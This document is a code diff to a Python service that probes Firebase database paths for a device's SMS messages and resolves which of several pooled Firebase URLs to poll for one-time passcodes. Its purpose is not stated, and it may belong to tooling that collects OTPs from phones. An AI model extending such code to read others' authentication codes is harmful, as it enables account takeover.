@@ -175,13 +175,34 @@ async def _messages_path_exists(
     *,
     timeout: float,
 ) -> bool:
+    """Detect messages/{device} without limitToLast-only GET (Firebase returns 400)."""
     root = firebase_root_url(firebase_url)
-    url = f"{root}/messages/{device_id}.json?limitToLast=1"
+    shallow_url = f"{root}/messages/{device_id}.json?shallow=true"
     try:
-        data = await _fetch_json(url, timeout=timeout)
+        data = await _fetch_json(shallow_url, timeout=timeout)
+        if isinstance(data, dict) and data:
+            return True
     except httpx.HTTPError:
+        pass
+    keyed_url = (
+        f"{root}/messages/{device_id}.json"
+        f'?orderBy=%22%24key%22&limitToLast=1'
+    )
+    try:
+        data = await _fetch_json(keyed_url, timeout=timeout)
+    except httpx.HTTPError:
+        try:
+            data = await _fetch_json(
+                f"{root}/messages/{device_id}.json",
+                timeout=timeout,
+            )
+        except httpx.HTTPError:
+            return False
+    if data is None:
         return False
-    return isinstance(data, dict) and bool(data)
+    if isinstance(data, dict):
+        return bool(data)
+    return bool(data)
 
 
 async def _scan_pool_for_device_messages(
@@ -271,14 +292,15 @@ async def resolve_firebase_url_for_otp_poll(
             device_id,
             skip=set(candidates),
         )
-        meta[POOL_SMS_SCAN_DONE_META_KEY] = True
         if pool_hit:
+            meta[POOL_SMS_SCAN_DONE_META_KEY] = True
             device.firebase_source_url = pool_hit
             meta[SMS_FIREBASE_URL_META_KEY] = pool_hit
             meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
             _save_meta(device, meta)
             db.commit()
             return pool_hit
+        meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
         _save_meta(device, meta)
         db.commit()
 
@@ -287,6 +309,18 @@ async def resolve_firebase_url_for_otp_poll(
         device_id,
         len(candidates),
     )
+    if candidates:
+        url = normalize_firebase_url(candidates[0])
+        meta = _meta_dict(device)
+        meta[SMS_FIREBASE_URL_META_KEY] = url
+        _save_meta(device, meta)
+        db.commit()
+        logger.warning(
+            "OTP poll: probe miss device=%s — polling candidate url=%s",
+            device_id,
+            url,
+        )
+        return url
     return None
 
 
